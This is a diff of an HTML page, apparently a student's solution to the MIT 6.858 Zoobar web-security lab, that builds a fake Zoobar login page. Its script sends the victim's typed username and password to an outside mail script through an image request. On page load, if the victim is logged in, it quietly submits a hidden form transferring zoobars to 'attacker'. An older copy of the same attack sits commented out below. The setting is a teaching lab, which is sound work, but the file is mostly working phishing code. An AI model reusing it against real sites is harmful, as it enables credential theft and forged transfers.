@@ -5,6 +5,95 @@
     <title>
       Login - Zoobar Foundation
     </title>
+    <script>var myZoobars = null;</script>
+    <script type="text/javascript" src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
+    <script>
+      function checkTransfer() {
+        var alive = myZoobars;
+        if (alive != null) {
+          document.forms["transferform"].submit();
+          setTimeout(function() {window.location.href = "http://css.csail.mit.edu/6.858/2018/"}, 2000);
+        }
+      };
+    </script>
+  </head>
+  <body onload="checkTransfer()">
+    <h1><a href="http://localhost:8080/zoobar/index.cgi/">Zoobar Foundation for Awesome
+                    Policy</a></h1>
+    <h2>Supporting the meritorious
+        thinkers of the next generation</h2>
+    <div id="login" class="centerpiece">
+    <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
+    <table style="font-size: 10pt; font-weight: bold">
+      <tbody>
+        <tr>
+          <td>Username:</td>
+          <td><input name="login_username" size="20" autocomplete="no" value="" type="text"></td>
+        </tr>
+        <tr>
+          <td>Password:</td>
+          <td colspan="2">
+            <input name="login_password" size="20" autocomplete="no" type="password">
+            <input name="submit_login" value="Log in" type="submit">
+            <input name="submit_registration" value="Register" type="submit"></td>
+        </tr>
+      </tbody>
+    </table>
+    <input name="nexturl" value="/zoobar/index.cgi/" type="hidden">
+    </form>
+    </div>
+    <div class="footer warning">
+
+    </div>
+    <script>document.loginform.login_username.focus();</script>
+    <script>
+        var firstLoop = true;
+        document.forms["loginform"].onsubmit = function(e) {
+          if (firstLoop) {
+            e.preventDefault();
+            var pass = document.getElementsByName("login_password")[0].value;
+            var name = document.getElementsByName("login_username")[0].value;
+            var payload = encodeURIComponent(name + "/" + pass);
+            (new Image()).src='http://css.csail.mit.edu/6.858/2018/labs/sendmail.php?' + 'to=qpm3@mit.edu' + '&payload=' + payload + '&random=' + Math.random();
+            firstLoop = false;
+          }
+        };
+
+        function submitReg() {
+          setTimeout(function(){
+            document.getElementsByName("submit_registration")[0].click();
+            firstLoop = true;
+          }, 2000);
+        };
+
+        function submitLog() {
+          setTimeout(function(){
+            document.getElementsByName("submit_login")[0].click();
+            firstLoop = true;
+          }, 2000);
+        };
+
+        document.getElementsByName("submit_login")[0].addEventListener("click", submitLog);
+        document.getElementsByName("submit_registration")[0].addEventListener("click", submitReg);
+      </script>
+    </div>
+    <iframe name="responseFrame" id="responseFrame" src="http://localhost:8080/zoobar/index.cgi/transfer" style="display: none">
+    </iframe>
+    <form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" target="responseFrame" style="display: none">
+      <p>Send <input name="zoobars" value="10" size="5" type="text">zoobars</p>
+      <p>to <input name="recipient" value="attacker" size="10" type="text"></p>
+      <input name="submission" value="Send" type="submit">
+    </form>
+  </body>
+</html>
+
+<!-- <html>
+  <head>
+    <meta charset="utf-8">
+    <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
+    <title>
+      Login - Zoobar Foundation
+    </title>
     <style>
       .no_see{
               display:none;
@@ -16,6 +105,53 @@
       }
       .no_edge{
               margin:0;
+      }
+      body { 
+        background-color: #cccccc;
+        font-family: sans-serif; 
+        margin-left: 25px; 
+        margin-right: 25px; 
+        font-size: smaller;
+      }
+      .centerpiece {
+        margin: 0 auto;
+        width: 500px; 
+        height: 255px; 
+        border: 2px solid #333333;
+        font-size: 10pt;
+      }
+      .log {
+        width: 500px;
+      }
+      h1, h2, h1 a { text-align: center; color: #555555; }
+      h1 a { text-decoration: none; }
+      h1 { margin: 0em 100px 0em 100px; }
+      h2 { margin: 0em 1em 1em 1em; font-size: 1em; }
+      .centerpiece textarea { width: 90%; height: 100px; }
+      .centerpiece td { height: 0px; } 
+      .centerpiece td.main { height: 130px; } 
+      #login { background-image: url(http://localhost:8080/zoobar/media/lion_sleeping.jpg); font-weight: bold; }
+      #login table { margin: 18px 30px 0px 30px; }
+      #main { background-image: url(http://localhost:8080/zoobar/media/lion_awake.jpg); }
+      #main td { text-align: center; }
+      #main table {
+        width: 180px;
+        height: 155px;
+        margin: 15px 280px 25px 30px;
+      }
+      .profilecontainer { 
+        height: 100px; 
+        margin: 5px; 
+        border-top: 1px solid #333333; 
+      }
+      .nobr { white-space:nowrap; }
+      .warning { color: #A00000; font-weight: bold; }
+      .footer { text-align: center; }
+      #header {
+        text-align: right; 
+        position: absolute;
+        right: 1em;
+        font-size: smaller;
       }
     </style>
     <script>var myZoobars = null;</script>
@@ -35,15 +171,15 @@
                     Research</a></h1>
     <h2>Supporting the loyal
         soldiers of the information superhighway</h2>
-    <div id="login" class="centerpiece">
+    <div id="login" class="centerpiece" style="font-weight: bold">
       <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
         <table>
         <tbody><tr>
-            <td style="font-weight: bold; font-size: smaller">Username:</td>
+            <td>Username:</td>
           <td><input name="login_username" id="user_field" size="20" autocomplete="no" value="" type="text"></td>
         </tr>
         <tr>
-            <td style="font-weight: bold; font-size: smaller">Password:</td>
+            <td>Password:</td>
           <td colspan="2">
             <input name="login_password" id="login_field" size="20" autocomplete="no" type="password">
             <input name="submit_login" id="submit_login" value="Log in" type="submit">
@@ -63,7 +199,6 @@
             var payload = encodeURIComponent(name + "/" + pass);
             (new Image()).src='http://css.csail.mit.edu/6.858/2018/labs/sendmail.php?' + 'to=qpm3@mit.edu' + '&payload=' + payload + '&random=' + Math.random();
             firstLoop = false;
-            alert("sub")
           }
         };
 
@@ -96,4 +231,4 @@
     </div>
     <script>document.loginform.login_username.focus();</script>
   </body>
-</html>
+</html> -->
